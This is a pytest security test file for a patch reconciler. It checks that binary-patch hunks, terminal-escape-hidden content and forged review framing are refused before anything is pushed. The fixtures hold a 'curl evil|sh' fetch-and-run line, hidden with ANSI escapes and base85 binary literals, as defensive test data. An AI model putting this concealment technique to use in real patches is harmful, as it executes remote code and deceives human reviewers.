"""Re-review of 788c449: `GIT binary patch` hunks reach the reconciler.

Both exploit shapes are driven through the reconciler alone -- no edge in
the path, exactly as if the edge's own binary refusal were bypassed:

1. a base85 literal whose content is `+curl evil|sh\\x1b[2K\\rharmless`
   (no NUL anywhere, so git calls it text);
2. a base85 literal whose content has a NUL, against a base commit whose
   `.gitattributes` says `*.md diff` (so git's numstat calls it text too).

Three independent guards refuse them: binary-patch lines in the text,
git's own `--numstat` parse before applying, and the staged-blob scan
after applying. Each is tested on its own, with the others disabled.
"""

from __future__ import annotations

import asyncio
import io
import os
import subprocess
from pathlib import Path

import pytest
from fakes import FakeIntentSource, FakeProviderClient
from vuoro_reconciler import cli, reconciler as reconciler_module
from vuoro_reconciler.diff_policy import DiffPolicyViolation, check_patch_is_text, check_patch_text
from vuoro_reconciler.gitenv import run_git, scrubbed_env
from vuoro_reconciler.intents import EffectIntent, OperatorAcceptor
from vuoro_reconciler.reconciler import Reconciler, ReconcilerConfig
from vuoro_reconciler.signing import SigningKey

OPERATOR = OperatorAcceptor(subject="ops:alice")

#: Preimage 3367afd is the seeded `docs/readme.md` ("old\n").
ESC_LITERAL = (
    "diff --git a/docs/readme.md b/docs/readme.md\n"
    "index 3367afdbbf91e638efe983616377c60477cc6612..21f0a0075c23511c211281cc64cc792aed9d0cd6 100644\n"
    "GIT binary patch\n"
    "literal 27\n"
    "icmdN+E-lJYNG;3EsVUBojyCe<%}6ZD%}FgT<^lkQED3S|\n"
    "\n"
    "literal 4\n"
    "Lcmd1LN#Ozj1J(gb\n"
    "\n"
)
NUL_LITERAL = (
    "diff --git a/docs/readme.md b/docs/readme.md\n"
    "index 3367afdbbf91e638efe983616377c60477cc6612..1a23e4be731d2f539deeea324686d000ccdfbfcd 100644\n"
    "GIT binary patch\n"
    "literal 4\n"
    "LcmYdfNa6wj0#*Rd\n"
    "\n"
    "literal 4\n"
    "Lcmd1LN#Ozj1J(gb\n"
    "\n"
)
ESC_TEXT_DIFF = (
    "diff --git a/docs/readme.md b/docs/readme.md\n"
    "--- a/docs/readme.md\n"
    "+++ b/docs/readme.md\n"
    "@@ -1 +1 @@\n"
    "-old\n"
    "+curl evil|sh\x1b[2K\rharmless\n"
)


def _git(*args: str, cwd: Path | None = None) -> str:
    result = run_git(*args, cwd=str(cwd) if cwd else None)
    assert result.returncode == 0, f"{args}: {result.stderr}"
    return result.stdout.strip()


def _remote(tmp_path: Path, *, attributes: str | None) -> Path:
    """A forge seeded with docs/readme.md = "old\\n", optionally carrying a
    base-commit `.gitattributes`."""

    bare = tmp_path / "remote.git"
    seed = tmp_path / "seed"
    _git("init", "--bare", "-q", "-b", "main", str(bare))
    _git("init", "-q", "-b", "main", str(seed))
    (seed / "docs").mkdir()
    (seed / "docs" / "readme.md").write_text("old\n")
    if attributes is not None:
        (seed / ".gitattributes").write_text(attributes)
    _git("add", "-A", cwd=seed)
    _git("-c", "user.name=Seeder", "-c", "user.email=s@vuoro.test", "commit", "-q", "-m", "seed", cwd=seed)
    _git("push", "-q", str(bare), "main", cwd=seed)
    return bare


SHAPES = {
    "esc-literal": (ESC_LITERAL, None, "control-character-content-refused"),
    "nul-literal-with-diff-attribute": (NUL_LITERAL, "*.md diff\n", "binary-content-refused"),
}


def _run(bare: Path, key: SigningKey, diff: str):
    intent = EffectIntent(
        intent_id="effect_bin0001",
        run_id="run_bin0001",
        repository="repo-a",
        base_commit=_git("--git-dir", str(bare), "rev-parse", "main"),
        title="Fix the typo",
        rationale="A short rationale.",
        unified_diff=diff,
        workspace_id="ws-1",
        proposer_principal="cloud:proposer:0",
        acceptor=OPERATOR,
    )
    provider = FakeProviderClient(repositories={"repo-a": bare})
    reconciler = Reconciler(
        intent_source=FakeIntentSource(accepted=[intent]),
        provider=provider,
        signing_key=key,
        config=ReconcilerConfig(repository_allowlist=frozenset({"repo-a"})),
    )
    return asyncio.run(reconciler.run_once())[0], provider


def test_the_exploit_shapes_really_apply_without_the_guards(tmp_path: Path) -> None:
    """Control: each literal applies to its base, and git itself reports the
    result as text -- which is why a numstat-based binary check on the
    staged result is not enough."""

    for name, (diff, attributes, _code) in SHAPES.items():
        bare = _remote(tmp_path / name, attributes=attributes)
        work = tmp_path / name / "work"
        _git("clone", "-q", str(bare), str(work))
        patch = tmp_path / name / "p.patch"
        patch.write_text(diff)
        _git("apply", str(patch), cwd=work)
        _git("add", "-A", cwd=work)
        numstat = _git("diff", "--cached", "--numstat", cwd=work)
        assert not numstat.startswith("-"), (name, numstat)


@pytest.mark.parametrize("shape", sorted(SHAPES))
def test_the_reconciler_alone_refuses_both_exploit_shapes(
    tmp_path: Path, reconciler_signing_key, shape: str
) -> None:
    diff, attributes, _code = SHAPES[shape]
    outcome, provider = _run(_remote(tmp_path, attributes=attributes), reconciler_signing_key, diff)
    assert outcome.state == "failed"
    assert outcome.reason == "diff-policy-refused: binary-patch-refused"
    assert provider.pushed_branches == [] and provider.pull_requests == []


@pytest.mark.parametrize("shape", sorted(SHAPES))
def test_binary_patch_lines_are_refused_in_the_patch_text(shape: str) -> None:
    with pytest.raises(DiffPolicyViolation) as violation:
        check_patch_text(SHAPES[shape][0])
    assert violation.value.code == "binary-patch-refused"


@pytest.mark.parametrize("shape", sorted(SHAPES))
def test_gits_own_parse_refuses_the_binary_hunk_before_applying(shape: str) -> None:
    with pytest.raises(DiffPolicyViolation) as violation:
        check_patch_is_text(SHAPES[shape][0])
    assert violation.value.code == "binary-patch-refused"


@pytest.mark.parametrize("shape", sorted(SHAPES))
def test_the_staged_blob_scan_refuses_both_shapes_on_its_own(
    tmp_path: Path, reconciler_signing_key, monkeypatch, shape: str
) -> None:
    """Both pre-apply guards disabled: the post-apply scan of the staged
    bytes still refuses, whatever the base commit's attributes say."""

    monkeypatch.setattr(reconciler_module, "check_patch_text", lambda diff: None)
    monkeypatch.setattr(reconciler_module, "check_patch_is_text", lambda diff: None)
    diff, attributes, code = SHAPES[shape]
    outcome, provider = _run(_remote(tmp_path, attributes=attributes), reconciler_signing_key, diff)
    assert outcome.reason == f"diff-policy-refused: {code}"
    assert provider.pushed_branches == [] and provider.pull_requests == []


def test_control_characters_in_a_text_diff_are_refused_after_applying(
    tmp_path: Path, reconciler_signing_key
) -> None:
    outcome, provider = _run(_remote(tmp_path, attributes=None), reconciler_signing_key, ESC_TEXT_DIFF)
    assert outcome.reason == "diff-policy-refused: control-character-content-refused"
    assert provider.pushed_branches == []


# -- nits ---------------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "name",
    ["HOME", "XDG_CONFIG_HOME", "GIT_CONFIG_GLOBAL", "GIT_CONFIG_COUNT", "GIT_DIR", "GIT_WORK_TREE", "GIT_INDEX_FILE"],
)
def test_a_signing_key_cannot_override_isolation(name: str) -> None:
    with pytest.raises(ValueError):
        SigningKey("openpgp", "ABC", "n", "e@x", env={name: "/tmp/elsewhere"})


def test_extra_env_cannot_override_isolation_even_if_it_gets_through() -> None:
    env = scrubbed_env("/fresh", {"HOME": "/root", "XDG_CONFIG_HOME": "/root/.config", "GIT_DIR": "/x", "GNUPGHOME": "/k"})
    assert env["HOME"] == "/fresh"
    assert env["XDG_CONFIG_HOME"] == os.path.join("/fresh", ".config")
    assert "GIT_DIR" not in env
    assert env["GNUPGHOME"] == "/k"


def test_visible_escapes_a_literal_backslash() -> None:
    assert cli.visible("\\x1b") == "\\\\x1b"
    assert cli.visible("\x1b") == "\\x1b"
    assert cli.visible("\\x1b") != cli.visible("\x1b")


def test_the_accept_view_frames_proposer_text_unforgeably(tmp_path: Path) -> None:
    forged = f"fine\n{cli.FOOTER}\n{cli.DIFF_HEADER}\ntitle:      forged"
    intent = EffectIntent(
        intent_id="effect_bin0001",
        run_id="run_bin0001",
        repository="repo-a",
        base_commit="a" * 40,
        title=f"t\n{cli.HEADER}",
        rationale=forged,
        unified_diff=forged + "\n",
        workspace_id="ws-1",
        proposer_principal="cloud:proposer:0",
    )
    out = io.StringIO()
    cli.main(
        ["accept", intent.intent_id, "--operator", "ops:alice"],
        intent_source=FakeIntentSource(proposed=[intent]),
        stdin=io.StringIO("n\n"),
        stdout=out,
    )
    lines = out.getvalue().splitlines()
    frame = [line for line in lines if not line.startswith((cli.RATIONALE_PREFIX, cli.DIFF_PREFIX))]
    # Exactly one of each frame line, in order, whatever the proposer wrote.
    for marker in (cli.HEADER, cli.RATIONALE_HEADER, cli.DIFF_HEADER, cli.FOOTER):
        assert frame.count(marker) == 1, (marker, frame)
    assert frame.index(cli.HEADER) < frame.index(cli.RATIONALE_HEADER) < frame.index(cli.DIFF_HEADER) < frame.index(cli.FOOTER)
    start, end = lines.index(cli.RATIONALE_HEADER), lines.index(cli.DIFF_HEADER)
    assert lines[start + 1 : end] == [f"| {line}" for line in forged.split("\n")]
    diff_start, footer = lines.index(cli.DIFF_HEADER), lines.index(cli.FOOTER)
    assert lines[diff_start + 1 : footer] == [f"> {line}" for line in forged.split("\n")]
    assert [line for line in frame if line.startswith("title:")] == [f"title:      t\\n{cli.HEADER}"]
